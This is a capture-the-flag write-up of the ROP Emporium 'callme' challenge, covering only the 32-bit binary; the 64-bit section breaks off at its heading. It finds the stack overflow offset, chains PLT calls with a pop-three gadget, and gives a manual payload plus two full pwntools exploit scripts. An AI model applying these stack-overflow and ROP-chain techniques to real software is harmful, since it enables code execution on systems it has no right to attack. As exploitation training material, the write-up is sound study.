Reliably make consecutive calls to imported functions.
Use some new techniques and learn about the Procedure Linkage Table.

Here is the hint to this challenge :

### Failure is not an option
How do you make consecutive calls to a function from your ROP chain that won't crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.

### Procedure Linkage Table
The Procedure Linkage Table (PLT) is used to resolve function addresses in imported libraries at runtime, it's worth reading up about it. See Appendix A in the Beginners' guide for a brief explanation of how the PLT is used in lazy binding. Even better, go ahead and step through the lazy linking process in a debugger, it's important you understand what resides at the addresses reported to you by commands like $ rabin2 -i <binary> and $ rabin2 -R .

Important!
---
#### To dispose of the need for any RE I'll tell you the following:
You must call the `callme_one(), callme_two() and callme_three()` functions **in that order**, each with the arguments `0xdeadbeef, 0xcafebabe, 0xd00df00d` e.g. 

> callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

The solution here is simple enough, use your knowledge about what resides in the PLT to call the `callme_` **functions in the above order and with the correct arguments**. If you're taking on the MIPS version of this challenge, don't forget about the branch delay slot.

> Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order.

Alternate solution
---
Once you've solved this challenge in the intended way you can revisit it and solve it using a different technique that can even get you a shell rather than just printing the flag. If you're out of ideas though, consider making it to the "pivot" challenge first so that you're equipped with the knowledge to take this alternate path.

Based off of this I guess that if I have an understanding of pivot I will be able to spwan shells not only pront flags, well lets see if I can do it.

Lets start with the 32-bit :
---
I first perform a file check to know the architecture of the binary :
> file callme32

I then perform a check securities, to know what securities have been enabled.
> checksec callme32

Then I checked for the strings and functions using the rabin2 tool.
> rabin2 -z callme32
> rabin2 -i callme32

We **dont have the system call this time**  we just have the three call me functions one, two, three. Looking at callme32 in ghidra we can see that the `main function` call pwn me, The `usefulFunction` calls all the 3 functions with their parameters.

So I pop in `gdb-pwndbg` to manually exploit the binary. So we do the usual, perform a `cyclic 100` to get a pattern which we add in when we run the binary so that it crashes. We then get the offset using `cyclic -l (characters in the EIP)`

With the `offset` we know the number of bytes to **overwrite the instriction pointer**`EIP` so that we can add the `callmeone` address. We will disassemble the `usefulFunctions` to get the addresses of the *call me functions*

So we will all the functions in this format, manually :
`We will have to call the functions with their parameters as we did see in ghidra.
> (callmeone address) 
0xdeadbeef,
0xcafebabe,
0xd00df00d

> (callmetwo address) 
0xdeadbeef,
0xcafebabe,
0xd00df00d

> (callmethree address) 
0xdeadbeef
0xcafebabe
0xd00df00d

And this is essensially the structure of the exploit,and what we are goint to be doing is, 

***NOTE : Because we are calling more than one function and they are reading the parameters off the stack*** *whenever we get to the second function call the stack won't be the same **we will have overide some of the values** in the stack* ***so what we will do we will have to look for a gadget that will be able to*** ***`pop three values off the stack after each function call.`*** *So that we can be able to repeat the process once again.*

To do that we will be using ropper and we will have to search for a gadget that will be poping three values off the stack.
> ropper -f callme32 -n 3 --search "pop" or 

> ropper -f callme32 --search "pop"

We will find a gadget that pops three values off the stack, it pops `esi;, edi; & ebp; ` and then it finishes with a return function ***ret;***. So this will be our `pop gadget`. and we will put this after every call function address.
```c++
(callmeone address) 
(gadget address) pop esi; 
0xdeadbeef,
0xcafebabe,
0xd00df00d

(callmetwo address)
(gadget address) pop edi; 
0xdeadbeef,
0xcafebabe,
0xd00df00d

(callmethree address)
(gadget address) pop ebp; 
0xdeadbeef
0xcafebabe
0xd00df00d
```

So this is how we will go about it manually. ***Note ; they should be in little endian format***

 > python2 -c 'print "A" * offset + **"callmeone"** + **"gadget address"** + **"0xdeadbeef"** + **"0xcafebabe"** + **"0xd00df00d"** + **"callmetwo"** + **"gadget address"** + **"0xdeadbeef"** + **"0xcafebabe"** + **"0xd00df00d"** + **"callmethree"** + **"gadget address"** + **"0xdeadbeef"** + **"0xcafebabe"** + **"0xd00df00d"**' > payload

 Run this payload with the binary and you will get the flag and that is how its done manually.

 ### pwntools script

 ```python
 from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './callme32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Locate the functions/strings we need
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

# Print out the target address
info("%#x callme_one", callme_one)
info("%#x callme_two", callme_two)
info("%#x callme_three", callme_three)

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of EIP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# ROP
rop = ROP(elf)  # Load rop gadgets
# print(rop.dump())
# pprint(rop.gadgets)

# Address needed to put parameters in registers
pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
info("%#x pop esi; pop edi; pop ebp; ret;", pop3)

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * eip_offset,
    callme_one,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_two,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_three,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
)

# Send the payload to a new copy of the process
io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
 ```



### autopwn script

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./callme32', checksec=False)
p = process()

# How many bytes to EIP?
padding = 44

# ROP
rop = ROP(elf)  # Load rop gadgets

params = [0xdeadbeef,
          0xcafebabe,
          0xd00df00d]

rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

# print(rop.dump())
# pprint(rop.gadgets)

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat({
    padding: rop_chain  # ROP
}
)

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
```
---
Let's do the 64-bit binary :
---

